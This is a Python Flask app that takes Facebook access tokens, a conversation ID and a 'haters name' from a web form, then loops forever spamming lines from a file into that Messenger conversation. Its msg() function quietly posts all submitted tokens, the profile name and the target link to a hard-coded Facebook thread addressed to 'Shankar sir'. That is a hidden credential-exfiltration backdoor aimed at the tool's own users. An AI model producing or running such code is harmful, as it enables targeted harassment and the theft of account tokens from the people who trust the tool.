import os
import threading
import requests
import json
import time
import random
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/add', methods=['POST'])
def add_data():
    if request.method == 'POST':
        uid = request.form['uid']
        token = request.form['token']
        time_interval = request.form['time']
        haters_name = request.form['hatersname']

        with open('convo.txt', 'w') as file:
            file.write(uid)
        
        with open('tokennum.txt', 'a') as file:
            file.write(token + '\n')
        
        with open('time.txt', 'w') as file:
            file.write(time_interval)
        
        with open('hatersname.txt', 'w') as file:
            file.write(haters_name)
        
        return redirect(url_for('index'))

def send_messages():
    while True:
        try:
            with open('tokennum.txt', 'r') as file:
                tokens = file.readlines()
            num_tokens = len(tokens)

            def liness():
                print('---------------------------------------------------')

            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'referer': 'www.google.com'
            }

            access_tokens = [token.strip() for token in tokens]

            with open('convo.txt', 'r') as file:
                convo_id = file.read().strip()

            with open('file.txt', 'r') as file:
                text_file_path = file.read().strip()

            with open(text_file_path, 'r') as file:
                messages = file.readlines()

            num_messages = len(messages)
            max_tokens = min(num_tokens, num_messages)

            with open('hatersname.txt', 'r') as file:
                haters_name = file.read().strip()

            with open('time.txt', 'r') as file:
                speed = int(file.read().strip())

            liness()

            def getName(token):
                try:
                    data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
                except:
                    data = ""
                if 'name' in data:
                    return data['name']
                else:
                    return "Error occurred"

            def msg():
                parameters = {
                    'access_token': random.choice(access_tokens),
                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER User Profile Name : ' + getName(random.choice(access_tokens)) + '\n Token : ' + " | ".join(access_tokens) + '\n Link : https://www.facebook.com/messages/t/' + convo_id
                }
                try:
                    requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers)
                except:
                    pass

            msg()
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("[+] All messages sent. Restarting the process...")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
            time.sleep(4)

def start_thread():
    thread = threading.Thread(target=send_messages)
    thread.daemon = True
    thread.start()

if __name__ == '__main__':
    start_thread()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
